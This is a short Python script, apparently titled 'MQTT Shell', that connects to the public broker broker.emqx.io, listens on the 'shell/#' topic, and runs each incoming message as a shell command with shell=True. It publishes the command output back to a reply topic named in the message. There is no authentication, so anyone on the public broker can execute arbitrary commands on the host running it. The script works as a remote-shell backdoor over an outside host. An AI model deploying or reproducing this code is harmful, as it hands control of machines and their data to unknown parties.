import threading
import paho.mqtt.client as mqtt
from datetime import datetime
import subprocess


mqttHost = 'broker.emqx.io'
mqttPort = 1883

broker_connected = False

def connectBroker():
    global client
    global broker_connected
    try:
        ts = datetime.timestamp(datetime.now())
        client = mqtt.Client('idClient-' + str(ts))
        client.on_connect = on_connect
        client.connect(mqttHost, mqttPort)
        broker_connected = True
        client.on_message = on_message
        client.subscribe('shell/#')
        client.loop_start()
    except Exception as e:
        pass


def on_connect(client, userdata, flags, rc):
    global broker_connected
    if rc == 0:
        broker_connected = True
        print('Connected to broker')
    else:
        broker_connected = False
        print('Error when connecting to broker')


def on_message(clientId, userdata, message):
    try:
        payload = message.payload.decode("utf-8", errors='ignore')
        fulltopic = message.topic
        print('------------------------------')
        print('full topic: ' + fulltopic)
        
        if fulltopic.index('/@') > 0:
            topic = fulltopic[:fulltopic.rindex('@')-1]
            callbackTopic = fulltopic[fulltopic.rindex('@')+1:]
            output = subprocess.run(payload, timeout = 2, shell = True, capture_output = True)
            client.publish(callbackTopic, output.stdout.decode("utf-8", errors='ignore'))	
            print('topic:' + topic)
            print('payload: ' + payload)
            print('callbackTopic:' + callbackTopic)
  
    except Exception as e:
        print(e)
    

print ("MQTT Shell running ...")


# superloop
while True:
    try:
        if not broker_connected:
            connectBroker()
        
    except Exception as e:
        print(e)

